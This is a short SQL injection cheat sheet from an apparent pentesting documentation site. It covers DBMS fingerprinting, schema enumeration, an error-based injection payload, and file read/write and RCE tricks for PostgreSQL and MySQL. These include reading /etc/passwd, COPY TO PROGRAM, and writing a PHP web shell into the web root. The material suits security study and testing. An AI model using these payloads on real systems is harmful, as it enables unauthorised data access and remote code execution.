---
title: "SQL Injection"
description: "Overview of SQL Injection"
lead: "Overview of SQL Injection"
date: 2023-01-01T00:00:00+00:00
lastmod: 2023-01-01T00:00:00+00:00
draft: false
images: []
menu:
  docs:
    parent: "server-side"
weight: 620
toc: true
---

## Definition

**SQL injection** allows attackers to execute malicious SQL queries through user input areas, potentially accessing, modifying, or deleting data.

## DMBS Identification

### Version

| DBMS        | Query                      | Output (example) |
| ----------- | -------------------------- | ---------------- |
| SQLite      | `SELECT sqlite_version()`  | 3.42.0           |
| MySQL       | `SELECT VERSION()`         | 5.7.38           |
| PostgreSQL  | `SELECT version()`         | PostgreSQL 14.8 ... |

### SQL Functions

| PostgreSQL           | SQLite              | MySQL               |
| -------------------- | ------------------- | ------------------- |
| `'a'\|\|'b'`         | `'a'\|\|'b'`        | `'a' 'b'`           |
| `POW(3,2)`           | `POW(3,2)`          | `POW(3,2)`          |
| `CHR(65)`            | `CHAR(65)`          | `CHAR(65)`          |
| `ASCII('A')`         | `UNICODE('A')`      | `ASCII('A')`        |
| `SUBSTR('abc',2,1)`  | `SUBSTR('abc',2,1)` | `SUBSTR('abc',2,1)` |
| `PG_SLEEP(4)`        | *Unknown*           | `SLEEP(4)`          |
| `SIMILAR TO`, `~`    | `REGEXP`, `GLOB`    | `REGEXP`            |

### Testing & Documentation

- [PostgreSQL - Online](https://onecompiler.com/postgresql/) - [Docs](https://www.postgresql.org/docs/)
- [MySQL - Online](https://onecompiler.com/mysql/) - [Docs](https://dev.mysql.com/doc/refman/8.0/en/)
- [MariaDB - Online](https://onecompiler.com/mariadb/)
- [Microsoft SQL Server - Online](https://onecompiler.com/sqlserver)
- [Oracle - Online](https://livesql.oracle.com/)
- SQLite3: run the command `sqlite3` - [Docs](https://www.sqlite.org/docs.html)

```bash
$ sudo docker run -d --rm --name test-postgres -e POSTGRES_PASSWORD=s3cr3t -e PGDATA=/var/lib/postgresql/data/pgdata postgres:16.3-bookworm
$ sudo docker exec -it test-postgres bash
root@1d5aa23dac7c:/# psql -U postgres
psql (16.3 (Debian 16.3-1.pgdg120+1))
Type "help" for help.

postgres=#
```

## Database enumeration

### MySQL

```sql
SELECT GROUP_CONCAT(schema_name,',') FROM information_schema.schemata;
SELECT GROUP_CONCAT(table_name,',') FROM information_schema.tables;
SELECT GROUP_CONCAT(column_name,',') FROM information_schema.columns WHERE table_name = 'users';
```

### PostgreSQL

```sql
SELECT datname FROM pg_database;
SELECT string_agg(table_name,',') FROM information_schema.tables;
SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name = 'users';
```

### SQLite

```sql
SELECT GROUP_CONCAT(tbl_name,',') FROM sqlite_master WHERE type='table' AND tbl_name NOT like 'sqlite_%';
SELECT sql FROM sqlite_master WHERE tbl_name='users';
SELECT GROUP_CONCAT(name,',') FROM PRAGMA_TABLE_INFO('users');
```

## Error based

### PostgreSQL

```sql
' AND 1=CAST((SELECT username FROM users) AS int)--
```

## File read/write & RCE

### PostgreSQL

```sql
SELECT pg_ls_dir('.');
SELECT pg_read_file('/etc/passwd');
COPY (SELECT '') TO PROGRAM 'sleep 5';

SELECT lo_import('/etc/passwd', 31337);
SELECT lo_get(31337);

SELECT lo_from_bytea(131337, decode('SGVsbG8gV29ybGQh', 'base64'));
SELECT lo_export(131337, '/tmp/exploit.so');
```

### MySQL

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT '<?php system($_REQUEST[c]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

## References

- [PostgreSQL SQL injection: SELECT only RCE - @adeadfed](https://adeadfed.com/posts/postgresql-select-only-rce/)